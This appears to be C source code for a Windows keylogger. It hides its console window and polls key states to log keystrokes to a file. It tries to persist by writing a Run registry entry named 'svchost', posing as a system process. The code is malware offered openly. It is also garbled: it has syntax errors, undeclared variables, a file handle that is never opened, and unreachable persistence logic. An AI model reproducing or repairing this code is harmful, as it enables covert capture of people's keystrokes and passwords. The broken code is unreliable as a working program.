#include<windows.h>
#include<stdio.h>
#include<winuser.h>
#include<windowsx.h>
#include<unistd.h>

#define BUFF 80

int tk(void);
int mk(char *);
int gt(void);

int main(void){
HWND stealth;
AllocConsole();
stealth=FindWindowA("ConsoleWindowClass,NULL);
ShowWindow(stealth,0);
int t,c;
t=tk();

int cwd = GetModuleFileName(NULL, pbuf, len);
if(cwd == 0)
	return -1;
else
	return cwd;


if (test==2){
	char *path="%cwd%\\svchost.exe";
	c=mk(path);
}
int x=gt();
return x;
}

int gt(void){
	short c;
	while(1){
	sleep(10);
	for(c=8;c<=222;c++){
		if(GetAsyncKeyState(c)==-32767){
			FILE *file;
			if(file==NULL){
				return 1;
			}
			if(file!=NULL){
				if((character>=39)&&(character<=64))
                                    {
                                          fputc(character,file);
                                          fclose(file);
                                          break;
                                    }       
                                    else if((character>64)&&(character<91))
                                    {
                                          character+=32;
                                          fputc(character,file);
                                          fclose(file);
                                          break;
                                    }
                                    else
                                    {
                                        switch(character)
                                        {
                                              case VK_SPACE:
                                              fputc(' ',file);
                                              fclose(file);
                                              break;   
                                              case VK_SHIFT:
                                              fputs("[SHIFT]",file);
                                              fclose(file);
                                              break;                                           
                                              case VK_RETURN:
                                              fputs("\n[ENTER]",file);
                                              fclose(file);
                                              break;
                                              case VK_BACK:
                                              fputs("[BACKSPACE]",file);
                                              fclose(file);
                                              break;
                                              case VK_TAB:
                                              fputs("[TAB]",file);
                                              fclose(file);
                                              break;
                                              case VK_CONTROL:
                                              fputs("[CTRL]",file);
                                              fclose(file);
                                              break;   
                                              case VK_DELETE:
                                              fputs("[DEL]",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_1:
                                              fputs("[;:]",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_2:
                                              fputs("[/?]",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_3:
                                              fputs("[`~]",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_4:
                                              fputs("[ [{ ]",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_5:
                                              fputs("[\\|]",file);
                                              fclose(file);
                                              break;                               
                                              case VK_OEM_6:
                                              fputs("[ ]} ]",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_7:
                                              fputs("['\"]",file);
                                              fclose(file);
                                              break;                                           
                                              case VK_NUMPAD0:
                                              fputc('0',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD1:
                                              fputc('1',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD2:
                                              fputc('2',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD3:
                                              fputc('3',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD4:
                                              fputc('4',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD5:
                                              fputc('5',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD6:
                                              fputc('6',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD7:
                                              fputc('7',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD8:
                                              fputc('8',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD9:
                                              fputc('9',file);
                                              fclose(file);
                                              break;
                                              case VK_CAPITAL:
                                              fputs("[CAPS LOCK]",file);
                                              fclose(file);
                                              break;
                                              default:
                                              fclose(file);
                                              break;
                                       }       
                                  }   
                             }       
                   }   
               }                 
 
           }
           return EXIT_SUCCESS;                           
}   
}
int tk(void){
	int ck;
	HKEY hKey;
	char path[BUFF];
	DWORD buf_length=BUFF;
	int rk;
rk=RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_QUERY_VALUE,&hKey);
if(rk!=0){
ck=1;
return ck;
}
rk=RegQueryValueEx(hKey,"svchost",NULL,NULL,(LPBYTE)path,&buf_length);
if((rk!=0)||(buf_length>BUFF))
ck=2;
if((rk==0)
ck=0;
RegCloseKey(hkey);
return ck;
}

int mk(char *path){
int rk,ck;
HKEY hkey;
rk=RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);
       if(rk==0)
       {
               RegSetValueEx((HKEY)hkey,"svchost",0,REG_SZ,(BYTE *)path,strlen(path));
               ck=0;
               return ck;
       }
       if(rk!=0)
               ck=1;
 
       return ck;
}
